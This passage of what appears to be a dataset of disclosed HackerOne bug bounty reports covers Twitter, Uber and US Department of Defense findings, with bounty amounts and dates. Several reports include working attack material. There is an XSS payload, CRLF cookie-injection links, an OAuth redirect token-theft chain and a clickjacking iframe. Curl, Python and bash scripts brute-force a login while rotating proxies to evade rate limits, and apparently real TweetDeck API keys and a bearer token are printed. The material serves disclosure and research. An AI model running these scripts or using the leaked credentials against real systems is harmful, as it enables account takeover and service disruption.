7   table { border: solid 1px #999999; border-collapse:collapse; empty-cells: show; padding:2px; }
8   th { font-weight: bold; background-color:#666666; color:#FFFFFF; text-align: left; }
9   th, td  { border-collapse:collapse; border: solid 1px #999999; }
10   tr.queue  { background-color:#F5F5F5; }
11   tr.warn  { background-color:#FF9090; }
12  </style>
13 </head>
14 <body>
15<h1>Stratus.025</h1>
16 </body>
17</html>",https://hackerone.com/reports/143935,California,United States,San Francisco,2016,6,9,18,41
Twitter,5001-10000,0.0,over-1b,"$1,400.00",No value,0.0,Cross-site Scripting (XSS) - Generic,[Stored XSS] vine.co - profile page,"xorb  submitted a report to Twitter.Nov 21st (8 years ago)Stored XSS via API request:
While creating new account in Windows mobile app, i noticed this request:
    PUT /users/1147563919679037440 HTTP/1.1
    avatarUrl=https%3A%2F%2Fvines.s3.amazonaws.com%2Favatars_trellis%2F2014%2F11%2F21%2F0B2EAE2EB81147563929149554688_1.3.4.jpg&username=
it seems that the variable username is not properly filtered, just set username to e.g. <svg/onload=alert()> and see result on your profile in vine web site. 
""demo"":
https://vine.co/u/1147563919679037440",https://hackerone.com/reports/36986,California,United States,San Francisco,2014,11,21,13,39
Twitter,5001-10000,0.0,over-1b,"$5,040.00",No value,0.0,Improper Authentication - Generic,[Studio.twitter.com] See someone else pics ,"anandprakash_  submitted a report to Twitter.Aug 31st (6 years ago)Hi Team,
Below URL is missing authorisation where user A who is not having access to user B's data is able to view the video/pics by user.
Vulnerable request:
Code 425 BytesWrap lines Copy Download1GET /1/library/list.json?account_id=4503599659510351&owner_id=12&limit=20&offset=0 HTTP/1.1
2Host: studio.twitter.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:37.0) Gecko/20100101 Firefox/37.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://studio.twitter.com/library
8Cookie: 
9Connection: keep-alive
10
11
12
Steps to reproduce:

Login to your studio.twitter.com account.
Go to studio.twitter.com/1/library/list.json?account_id=4503599659510351&owner_id=12&limit=20&offset=0 

Change the owner_id to see more of his private videos.
Thanks,
AnandSummary by anandprakash_Insecure direct object reference on studio.twitter.com.
Impact:
1) Can tweet from someone else's account by simply using owner_id  (user id of twitter) which is publicly available.
2) Can delete media from victim's account.
3) Can upload media from victim's account.
4) can view private media uploaded in victim's account.",https://hackerone.com/reports/164649,California,United States,San Francisco,2016,8,31,7,9
Twitter,5001-10000,0.0,over-1b,"$5,040.00",No value,0.0,Denial of Service,[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable,"filedescriptor  submitted a report to Twitter.Mar 5th (6 years ago)First of all, really sorry for the unintentional DoS :( I was testing it with a fresh bearer token but copied the production one accidentally.
Details
I've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token):
Code 727 BytesWrap lines Copy Download1GET https://api.twitter.com/1.1/help/settings.json?settings_version= HTTP/1.1
2Host: api.twitter.com
3Connection: keep-alive
4Authorization: Bearer AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
5Origin: https://tweetdeck.twitter.com
6X-Csrf-Token: 2170b7f455955368495bc191ed67c892
7User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
8Accept: text/plain, */*; q=0.01
9X-Twitter-Auth-Type: OAuth2Session
10X-Twitter-Client-Version: Twitter-TweetDeck-blackbird-chrome/4.0.170302174617 web/
11Referer: https://tweetdeck.twitter.com/
12Accept-Encoding: gzip, deflate, sdch, br
13Accept-Language: en-US,en;q=0.8
According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token
Now, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client. The consumer key and consumer secret can be extracted from the desktop application:
Code 99 BytesWrap lines Copy Download1Consumer key:    yT577ApRtZw51q4NPMPPOQ
2Consumer secret: 3neq3XqN5fO3obqwZoajavGFCUrC42ZfbrLXy5sCv8
Apparently, anyone can invalidate the bearer token while issuing token invalidation request:
Code 402 BytesWrap lines Copy Download1POST https://api.twitter.com/oauth2/invalidate_token HTTP/1.1
2Authorization: Basic eVQ1NzdBcFJ0Wnc1MXE0TlBNUFBPUTozbmVxM1hxTjVmTzNvYnF3Wm9hamF2R0ZDVXJDNDJaZmJyTFh5NXNDdjg=
3Host: api.twitter.com
4Content-Length: 125
5Content-Type: application/x-www-form-urlencoded;charset=UTF-8
6
7access_token=AAAAAAAAAAAAAAAAAAAAAF7aAAAAAAAAi95Q2QkUrMfOxflMJIWoZ3JcvJw%3DOLBx5qSvcDbL37ad9Moq9MtZN2yYQ0r6zKtIupfa5AEbVAoZnM
And suddenly all the requests on TweetDeck result in {""errors"":[{""code"":89,""message"":""Invalid or expired token.""}]}.",https://hackerone.com/reports/210779,California,United States,San Francisco,2017,3,5,5,51
Twitter,5001-10000,0.0,over-1b,"$7,560.00",High,7.95,None,[URGENT] Opportunity to publish tweets on any twitters account,kedrisch-4-t  submitted a report to Twitter.Feb 25th (6 years ago)Summary by kedrisch-4-tWrite-up of the vulnerability here: https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3,https://hackerone.com/reports/208978,California,United States,San Francisco,2017,2,25,22,7
Twitter,5001-10000,0.0,over-1b,$280.00,Critical,9.5,None,[██████████.gnip.com] .htpasswd disclosure,"rbcafe  submitted a report to Twitter.Apr 7th (6 years ago)Greetings,
There is a .htpasswd disclosure on your subdomain :

Go to : http://█████████.gnip.com/.htpasswd
previewgnip:██████

{F173925}
Fix : 
Protect the htpasswd file",https://hackerone.com/reports/219197,California,United States,San Francisco,2017,4,7,2,8
Twitter,5001-10000,0.0,over-1b,$420.00,Low,3.7,Improper Restriction of Authentication Attempts,Ability to bruteforce mopub account’s password due to lack of rate limitation protection using {ip rotation techniques},"updatelap  submitted a report to Twitter.Mar 16th (3 years ago)Summary
I tried to guess on my account. I sent out nearly 1,000 requests, and I was virtually banned on request about 120. But when I changed my IP and tried logging in, I was logged into the account without any additional checks 
Description:*
Your web authentication endpoint, https://app.mopub.com/web-client/api/user/login, (POST), currently protects against credentials brute-force attacks only by requests rate-limiting based on IP.  This bug could allow an attacker to bruteforce the password of mopub users. This happens because mopub developer not set rate limitation protection in login page
Reproduction
To test this, send a POST request to ""https://app.mopub.com/web-client/api/user/login"" with the following parameters in the body:
Code 56 BytesWrap lines Copy Download1{""username"":""TARGET@exmple.com"",""password"":""HACKEDP@SS""}
Using curl, we can run an attack against a list of password with a fixed username (in this example ""TARGET@exmple.com""), You can use the following command to start guessing passwords from PASS_LIST Put in your list about 1000 passwords and start guessing. You will notice that you will be banned after several trials.
Code 1.44 KiBWrap lines Copy Download1while read pass; do curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: ███████' -H $'Origin: https://app.mopub.com' -H $'Referer: https://app.mopub.com/login?next=/' -H $'Cookie: csrftoken=███████; _ga=██████; mp__mixpanel=%7B%22distinct_id%22%3A%20%███%22%2C%22%24device_id%22%3A%20%███████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ██████_mixpanel=%7B%22distinct_id%22%3A%20%22██████████%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22█████%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22████████%22%7D; mp_mixpanel__c=3' --data-binary $'{\""username\"":\""alert.wids@gmail.com\"",\""password\"":\""$pass\""}'     $'https://app.mopub.com/web-client/api/user/login';done < PASS_LIST
To bypass this protection a brute-force python script was developed that performs a login brute-force attack by rotating through these addresses, to never have a request refused. This effectively overcomes the IP-rate limiting and allows a full-fleged online brute-force attack at virtually unlimited speeds. 
Code 2.07 KiBWrap lines Copy Download1from proxy_requests.proxy_requests import ProxyRequests
2
3class bcolors:
4    BOLD = '\033[1m'
5    CRED = '\033[91m'
6
7Pass = [""12345"",""admin"",""user"",""root"",""love"",""love2020"",""uk2020"",""asdfg"",""qwerty12345"",""██████████"",""████████"",""█████"",""████"",""███"",""passwOrd"",""Password"",""████"",""█████████"",""R00T"",""█████████"",""███████"",""███████"",""████""]
8array_length = len(Pass)
9
10I = 0 
11for I in range(array_length):
12    r = ProxyRequests(""https://app.mopub.com/web-client/api/user/login"")
13    r.set_headers({
14        'x-csrftoken': '█████',
15        'Origin': 'https://app.mopub.com',
16        'Content-Type':'application/json',
17        'Referer':'https://app.mopub.com/login?next=/',
18        'Cookie': 'csrftoken=████████; _ga=█████; mp__mixpanel=%7B%22distinct_id%22%3A%20%████%22%2C%22%24device_id%22%3A%20%████████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ██████████_mixpanel=%7B%22distinct_id%22%3A%20%22████████%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22██████%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22███████%22%7D; mp_mixpanel__c=3'
19    })
20    r.post_with_headers({'username':'alert.wids@gmail.com','password':''+Pass[I]+''})
21    if r.get_status_code() == 401 or r.get_status_code() == 400:
22       print (bcolors.CRED + ""[*-*] Incorrect password: "" + Pass[I] + "" | Res_status: "" + str(r.get_status_code()), "" | IP_Proxy:"" + str(r.get_proxy_used()) + ""]""  )
23    elif r.get_status_code() == 204:
24       print (bcolors.BOLD + ""[*u*] Correct password: "" + Pass[I] + "" | Res_status: "" + str(r.get_status_code()), "" | IP_Proxy:"" + str(r.get_proxy_used()) + ""]"" )
25    I+= 1
Recommendation:
Implement a Captcha after a reasonable number of failed login attempts against one account at the application-layer. The Captcha should not only be shown to offending IP addresses, but to anyone who attempts to login to the account under attack. Another option is to enable an account lockout policy which effectively locks down an account that has been attacked (e.g. after 20 failed consecutive logins) and requires out-of-band validation by the real account owner (e.g. email, mobile) before becoming accessible again.
Best regards,
Impact
A malicious user could run this against a huge list of mopub password with a fixed username, after that attack is finished he changes the password.  An attacker can freely bruteforce any username and can takeover any accountbugtriage-sophia   changed the status to Needs more info. Updated Mar 17th (3 years ago)Thank you for your report @updatelap,
We had some trouble reproducing this behavior using your POC. After approximately twelve requests we received the following error socket.timeout: The read operation timed out. After we saw this error we attempted to login to alert.wids@gmail.com account normally and we encountered an extra long delay. It seems there is a security control on this endpoint which increases the delay between each login attempt on a particular account.
Can you provide us a video that demonstrates you can use this behavior to guess 1000 potential passwords on a single account without encountering such long delays?
Thank you for thinking of Twitter securityupdatelap   changed the status to New. Updated Jul 10th (2 years ago)Hi @bugtriage-sophia,
Thanks you for you reply, YYes, of course, I will attach a video of proof to you. This time, I used AWS API Gateway to bypass IP protection and did not encounter any problems when I sent 1000 requests within 5 minutes.
████
If you have your own proxy addresses and want to repeat the attack, write the following code for you. All you have to do is add your own proxy addresses in the proxyip=() array and run the script. Or use your AWS API Gateway with IPRotate_Burp_Extension
Code 1.20 KiBWrap lines Copy Download1#!/bin/bash
2
3proxyip=(proxy1 proxy2 ...) //put your proxy here
4
5pass=(pass1 pass2 ...) //put your list of password here
6
7echo ""|    PASSWORD      |       PORXY_IP                        Server_Status ""
8for (( i=0; i<=100; i++))
9do
10  proxys=${proxyip[i]}
11  
12  COUNTER=0
13  for (( p; p<=999; p=$[$p+1]))
14  do  
15    COUNTER=$[$COUNTER +1]
16    pas=${pass[p]} 
17    res=`curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: █████████' -H $'Content-Length: 62' -H $'Origin: https://app.mopub.com' -H $'Connection: close' -H $''-H $'Referer: https://app.mopub.com/login' -H $'Cookie: csrftoken=████'   -b $'csrftoken=█████████'     --data-binary $'{\""username\"":\""alert.wids@gmail.com\"",\""password\"":'\""$pas\""'}'  $'https://app.mopub.com/web-client/api/user/login' -x ""$proxys"" | grep -a ' 403\| 400\| 204\| 401\| 503'`      
18   
19    echo ""|    $pas         |       $proxys                ${res}""
20    if [[ $COUNTER -ge 5 ]]; then 
21      break
22    fi 
23      continue
24  done
25  p=$[$p + 1]
26done
Thanks,
Jafarbugtriage-sophia   posted a comment. Mar 24th (3 years ago)Thank you for your follow-up @updatelap,
We are investigating the behavior you described and will get back to you when we have more information.
Thank you for thinking of Twitter security.began   changed the status to Triaged. Mar 24th (3 years ago)Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.
Thank you for helping keep Twitter secure!updatelap   posted a comment. Apr 6th (3 years ago)Hi @began,
I appreciate your effort. But I would like to inquire if there is any update regarding this report.
Thanks,
Jafarbegan   closed the report and changed the status to Resolved. Apr 14th (3 years ago)We consider this issue to be fixed now. Can you please confirm?
Thank you for helping keep Twitter secure!updatelap   posted a comment. Apr 14th (3 years ago)Hi @began;
Great work. I rechecked and found that the bug was fixed
Thanksupdatelap   posted a comment. Apr 14th (3 years ago)What are the timelines to bounty?Twitter  rewarded updatelap with a $420 bounty. Apr 20th (3 years ago)updatelap   requested to disclose this report. Jun 30th (2 years ago)asayler Twitter staff  agreed to disclose this report. Jul 10th (2 years ago)  This report has been disclosed. Jul 10th (2 years ago)",https://hackerone.com/reports/819930,California,United States,San Francisco,2020,3,16,6,31
Twitter,5001-10000,0.0,over-1b,$560.00,Medium,5.45,Denial of Service,cookie injection allow dos attack to periscope.tv,"protostar0  submitted a report to Twitter.May 18th (4 years ago)Description: i find in  periscope.tv  a parameter ""create_user"" allow to inject ""loginissignup"" cookie,
when tested with crlf payload get response ""HTTP/1.1 504 GATEWAY_TIMEOUT""
 Link Vulnerable: https://www.periscope.tv/i/twitter/login?create_user=*payload*&csrf=*your_csrf_token*
## Steps To Reproduce:


go to https://www.periscope.tv/


click to login 


click create new account


choose twitter [ google & facebook also vulnerable]
5-get link like https://www.periscope.tv/i/twitter/login?create_user=true&csrf=*your_csrf_token*
6-edit create_user parameter 


example : edit domain & max-age of loginissignup cookie 
payload=""exploit;Domain=hakou.com;Max-Age=1000000000000000000000""
link=https://www.periscope.tv/i/twitter/login?create_user=exploit;Domain=hakou.com;Max-Age=1000000000000000000000&csrf=*your_csrf_token*
poc coo1.jpg (F492114)
example2: dos attack 
payload=""dosattack%0d%0ahakou""
link=https://www.periscope.tv/i/twitter/login?create_user=dosattack%0d%0ahakou&csrf=*your_csrf_token*
get this response 

HTTP/1.1 504 GATEWAY_TIMEOUT
Content-Length: 0
Connection: Close

poc
coo2.jpg (F492115)
Impact
inject cookie & dos attack2 attachments:F492114: coo1.jpgF492115: coo2.jpg",https://hackerone.com/reports/583819,California,United States,San Francisco,2019,5,18,5,35
Twitter,5001-10000,0.0,over-1b,$560.00,No value,0.0,Violation of Secure Design Principles,Improper Verification of email address while saving Account Settings,"anshuman_bh  submitted a report to Twitter.Oct 10th (8 years ago)

Signup for Ads on twitter and navigate to ""Account Settings"" on ads.twitter.com/accounts


Enter any email address and save Account Settings. Notice that the email address gets updated successfully.


There is no verification email that is sent out to confirm that the email account updated actually belongs to the user account. 


This can be exploited or misused in a few ways. One such way is:


An attacker changes his account settings to update the email address to a victim's email address.


The attacker then navigates to Audience Manager and creates a list audience by uploading a CSV data file.


After some time, the victim receives an email from twitter saying that ""Your uploaded list test did not match enough people on Twitter to create a usable audience.""  See attached screenshot. 


The victim remains clueless as the attacker just leveraged the twitter platform to send this email to the victim. 


There might be other possible ways as well that an attacker can leverage the twitter email service to spam innocent victims.
Remediation:
On updating the email address under Account Settings, it should be verified by sending a confirmation link. 
PS - I understand that spamming is generally excluded from the scope of this bounty but when I clicked on the link provided under the Program details, it took me to a page which appears to only mention spamming attacks caused directly by attackers targeting victims. In this case, the attacker is completely out of the picture and is leveraging the twitter platform to spam victims. I just wanted to point that out. 1 attachment:F18569: 2014-10-10_13_51_26-anshuman_b_2000_-_Yahoo_Mail.pngmfinifter   closed the report and changed the status to Not Applicable. Oct 10th (8 years ago)Thanks for the detailed report.
I agree that this could be confusing for a victim in this situation, but I don't think there are any real security implications here.  As you mentioned, this is just spam in the worst case, and it is spam in which the attacker doesn't control any of the message content.
There's not much motivation for an attacker to launch a spam campaign where he doesn't control any of the message content, and this attack is further mitigated by the fact that there is an ""Unsubscribe"" link in the email the victim receives.
Unless I'm missing something here (please let me know if I am!), we don't plan to make any changes at this time based on this report.
Thanks again for thinking of Twitter security!
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Oct 13th (8 years ago)Hi Matt,
After some more testing, I noticed that it is indeed possible to control some part of the email that is sent to the victim. See attached screenshot. The email contains the name of the audience list which was the URL http://www.test.com/ in my case. So, attackers can easily phish victims this way. Hope this helps!1 attachment:F18659: Screen_Shot_2014-10-12_at_10.23.57_PM.png
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Oct 13th (8 years ago)And, you mentioned that this is mitigated by the fact that they can click on Unsubscribe. But, if the victims do that, then they are technically un-subscribing to receive emails regarding their own legitimate accounts as well. So, that is definitely not mitigating the issue but completely blocking all future emails from twitter which I don't think the victim would want to do. 
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Oct 13th (8 years ago)Let me know if you still think that this does not have any security implication.mfinifter   reopened this report. Oct 13th (8 years ago)We'll look into this again and get back to you.  Thanks.mfinifter   changed the status to Triaged. Oct 14th (8 years ago)Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.
Thank you for helping keep Twitter secure!Twitter  rewarded anshuman_bh with a $560 bounty. Oct 20th (8 years ago)Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Nov 14th (8 years ago)Has this been fixed yet?cmiller   posted a comment. Nov 19th (8 years ago)Hi, thank you for your interest in this issue. We are still working on it and will let you know when it is resolved.
Thank you for your patience!
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Feb 3rd (8 years ago)Any updates?bensdp-twitter   posted a comment. Feb 3rd (8 years ago)Hi, thank you for your interest in this issue. We are still working on it and will let you know when it is resolved.
Thank you for your patience!
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Feb 20th (8 years ago)I just noticed that this option of setting email on the ads.twitter.com/accounts has disappeared?
    
    
        
            
                
                
                
            
        
    
anshuman_bh   posted a comment. Apr 28th (8 years ago)It has been 3 months since the last update. I would appreciate some status on this issue and my comment above. Not to forget, this issue has been open since 7 months now. If the option has been removed, why is this bug not Resolved/Closed? cmiller   closed the report and changed the status to Resolved. Apr 28th (8 years ago)Sorry, we'll close the bug.
Thank you for helping keep Twitter secure!anshuman_bh   requested to disclose this report. May 7th (8 years ago)  This report has been disclosed. Aug 13th (7 years ago)",https://hackerone.com/reports/30975,California,United States,San Francisco,2014,10,10,17,56
Twitter,5001-10000,0.0,over-1b,$840.00,No value,0.0,Improper Authentication - Generic,[Critical] - Steal OAuth Tokens,"tuckercarlson  submitted a report to Twitter.Apr 15th (7 years ago)Hi,
This bug is caused because of the same mis-configuration as #128119. Only this time Microsoft Outlook auth is vulnerable instead of Facebook. this time I will try to be as clear as possible. after sign up of Twitter, Twitter asks users to import contacts (and it only requires on authorization) - or simply going to https://twitter.com/who_to_follow/import will do that.
I believe you have configured your oauth redirect_uri as twitter.com in your app settings. Meaning Microsoft will accept:

http://twitter.com as valid
http://anything.twitter.com as valid
https://twitter.com as valid
https://anything.twitter.com/path/?anything as valid

So the forumla of a valid redirect_uri for twitter app is http(s?)://.twitter.com/
Okay, so now we make an open redirect. 
https://cards.twitter.com/cards/18ce53y6aap/yyms redirects to http://test.com and qualifies to bypass http(s?)://.twitter.com/ and we will add %2523 behind it like https://cards.twitter.com/cards/18ce53y6aap/yyms%2523 for microsoft to decode and send as a Hash %2523 -> %23 -> # with our stolen access_token.
We can then obtain this token using location.hash and all the user had to do is a single click (if already authorized - lots of people have)
To make things more clear, here is unlisted YouTube video to demonstrate how this works: https://youtu.be/apwbVpa2r6Y (also attached)
Thanks,
Paulos1 attachment:F85930: Twitter_Outlook_Bypass.avi",https://hackerone.com/reports/131202,California,United States,San Francisco,2016,4,15,21,3
Twitter,5001-10000,0.0,over-1b,"$1,540.00",Medium,6.8,None,protected Tweet settings overwritten by other settings,"singo_edan  submitted a report to Twitter.Jul 30th (3 years ago)protected tweet settings will be disabled without the account owner's knowledge
step for reproduction
1.Log in to an account with unprotected tweets on the Android app.
2. Log in to the same account on mobile.twitter.com and turn on protected tweets.
3. Confirm that the account's tweets are protected.
4. In the Android app, go to the NOTIFICATION the  click for ON
5. The account's tweets are now unprotected.
I have deleted all data (stored data and cache), so you don't need to save any cache or history!
Impact
your tweet not protected1 attachment:F543456: 20190731_062904.mp4",https://hackerone.com/reports/664038,California,United States,San Francisco,2019,7,30,23,46
Twitter,5001-10000,0.0,over-1b,$560.00,Low,2.5,None,Protected Tweets setting overridden by Android app,"nyuszika7h  submitted a report to Twitter.Mar 30th (4 years ago)Summary: Protected Tweets setting overridden by Android app
Description: The Android app overrides the ""Protect your Tweets"" setting set from outside the app in some cases when changing other settings.
Steps To Reproduce:

Log in to an account with unprotected tweets on the Android app.
Log in to the same account on mobile.twitter.com and turn on protected tweets.
Confirm that the account's tweets are protected.
In the Android app, go to the Direct Messages tab, click the gear icon and change a setting such as ""Receive message requests"" or ""Show read receipts.""
The account's tweets are now unprotected.

If this does not work, you may have to first explicitly unset the protected tweets setting in the Android app before setting it elsewhere.
Impact:
This can cause a user's tweets to unknowingly become public. It is possible this could be exploited by an attacker asking the user to change their settings but that is less likely to succeed than with the previous bug where only changing the email address was required.
Impact
See above.",https://hackerone.com/reports/519059,California,United States,San Francisco,2019,3,30,13,55
Twitter,5001-10000,0.0,over-1b,"$1,120.00",Medium,5.45,UI Redressing (Clickjacking),Twitter Periscope Clickjacking Vulnerability,"eo420  submitted a report to Twitter.May 28th (3 years ago)Bonjour,
Summary
X-Frame-Options ALLOW-FROM https://twitter.com/ not supported by several Browser, this caused Clickjacking on Twitter Periscope subdomain (https://canary-web.pscp.tv & https://canary-web.periscope.tv)
Steps To Reproduce:

Create a new HTML file
Put <iframe src=""https://vulnerable.site"" frameborder=""0""></iframe>
Save the file
Open document in browser

Impact
Attacker may tricked user, sending them malicious link then user open it clicked some image and their account unconsciously has been deactivated
Solution
The vulnerability can be fixed by adding ""frame-ancestors 'self';"" to the CSP (Content-Security-Policy) header.
NOTE

POC & Attacking Scenarios (https://vimeo.com/338854681 PASS:Per!scop3^)

References
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
https://www.owasp.org/index.php/Clickjacking
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Clickjacking_Defense_Cheat_Sheet.md
Cheers!4 attachments:F497887: Screenshot_21.pngF497899: Screenshot_22.pngF497901: POC.htmF497902: Periscope.zip",https://hackerone.com/reports/591432,California,United States,San Francisco,2019,5,28,11,59
Twitter,5001-10000,0.0,over-1b,$280.00,Medium,5.45,Information Disclosure,[staging-engineering.gnip.com] Publicly accessible GIT directory,"bobrov  submitted a report to Twitter.Apr 4th (6 years ago)Steps to reproduce:
Open http://staging-engineering.gnip.com/.git/logs/refs/heads/master
Publicly accessible GIT directory сan lead to leakage of source code and other private information.",https://hackerone.com/reports/218465,California,United States,San Francisco,2017,4,4,6,47
U.S. Dept Of Defense,101-250,0.0,1m-10m,"$3,000.00",High,7.95,Cryptographic Issues - Generic,[HTAF4-213] [Pre-submission] CVE-2018-2879 (padding oracle attack in the Oracle Access Manager) at https://█████████,"sp1d3rs  submitted a report to U.S. Dept Of Defense.Nov 3rd (3 years ago)Description
We were able to identify CVE-2018-2879 in Oracle Access Manager, used on the https://██████
Link to the CVE: https://nvd.nist.gov/vuln/detail/CVE-2018-2879
This vulnerability is rated critical, and may allow unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager.
It's possible to conduct padding oracle attack and recover plaintext from encquery parameter
Materials:
https://sec-consult.com/en/blog/2018/05/oracle-access-managers-identity-crisis/
POC
We modified https://github.com/redtimmy/OAMBuster/blob/master/oambuster.py proof-of concept for https://█████ (it required some changes, for example gcds-consent=true is necessary in all requests to not face with consent banner page.
Here is it:
█████████
It can be launched in the next way to simply test for padding oracle and recover plaintext:
Code 34 BytesWrap lines Copy Download1oambuster.py -d https://██████████
The result (decrypt process can take some time, for example on the screenshot above it's not fully finished, but you can already see readable parts):
███████
This confirms that vulnerability is valid.
Suggested fix
Apply patch & update OAM instance
Impact
Padding oracle attack allows us to decrypt any messages. As all the encrypted messages (encquery, encreply, OAMAuthnCookie) are encrypted with the same key, we can decrypt any of these messages.
This attack can also be used to encrypt messages. So if we construct a valid authentication cookie and encrypt it with our padding oracle attack, we can pass it off as valid to the web server and perform authentication bypass. 
We will research this further and will update report with new information.",https://hackerone.com/reports/728110,Ohio,United States,Cleveland,2019,11,3,4,23
Uber,10001,0.0,over-1b,"$3,000.00",High,7.1,Cross-site Scripting (XSS) - Stored,[First 30] Stored XSS on login.uber.com/oauth/v2/authorize via redirect_uri parameter,corb3nik  submitted a report to Uber.Aug 9th (4 years ago),https://hackerone.com/reports/392106,California,United States,San Francisco,2018,8,9,0,5
Uber,10001,0.0,over-1b,"$2,000.00",No value,0.0,Improper Authentication - Generic,[IODR] Get business trip via organization id,"severus  submitted a report to Uber.Jul 15th (6 years ago)Hi Uber,
I found issue on https://business.uber.com/server/organizations/[id]/trips2?per_page=15&requestAtStart=&requestAtStop=&count=true
Step to reproduce:

Get https://business.uber.com/server/organizations/[your_organization_id]/trips2?per_page=15&requestAtStart=&requestAtStop=&count=true
Chang to victim organization If valid id, it will return result, but if not it will show error with internal state 

Code 291 BytesWrap lines Copy Download1{""error"":{""name"":""TchannelUnexpectedError"",""fullType"":""tchannel.unexpected"",""type"":""tchannel.unexpected"",""message"":""Unexpected Error: 'validation_error.must_be_a_valid_uuid_v4'"",""isErrorFrame"":true,""codeName"":""UnexpectedError"",""errorCode"":5,""originalId"":2,""remoteAddr"":""10.160.14.41:21306""}}
In employee_invites, it return 403.
As previous I report #151465 , I can get organization id or just enum it ( very difficult).
Best regards,
Severus2 attachments:F105056: 15150716.jpgF105057: 15150716.jpg",https://hackerone.com/reports/151470,California,United States,San Francisco,2016,7,15,8,44
Uber,10001,0.0,over-1b,"$4,000.00",Critical,9.5,Cross-site Scripting (XSS) - Stored,[manage.jumpbikes.com] Blind XSS on Jump admin panel via user name,cablej  submitted a report to Uber.Dec 27th (4 years ago),https://hackerone.com/reports/472470,California,United States,San Francisco,2018,12,27,5,34
Uber,10001,0.0,over-1b,"$40,000.00",Critical,9.5,Insecure Storage of Sensitive Information,[Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked certificate in git repo,tomnomnom  submitted a report to Uber.May 28th (3 years ago),https://hackerone.com/reports/591813,California,United States,San Francisco,2019,5,28,22,10
Uber,10001,0.0,over-1b,"$1,000.00",No value,0.0,Information Disclosure,ability to retrieve a user's phone-number/email for a given inviteCode,kushal89shah  submitted a report to Uber.Oct 27th (6 years ago),https://hackerone.com/reports/178503,California,United States,San Francisco,2016,10,27,23,4
Uber,10001,0.0,over-1b,$750.00,High,7.5,Information Disclosure,"API on campus-vtc.com allows access to ~100 Uber users full names, email addresses and telephone numbers.","healdb  submitted a report to Uber.May 14th (4 years ago)Summary by healdbEndpoint leaked some PII for the 83 Uber France users who entered a contest on this site.
Check out my blog https://healdb.tech/blog/ or my Twitter https://twitter.com/heald_ben for some Bug Bounty tool releases and blogs!",https://hackerone.com/reports/580268,California,United States,San Francisco,2019,5,14,23,40
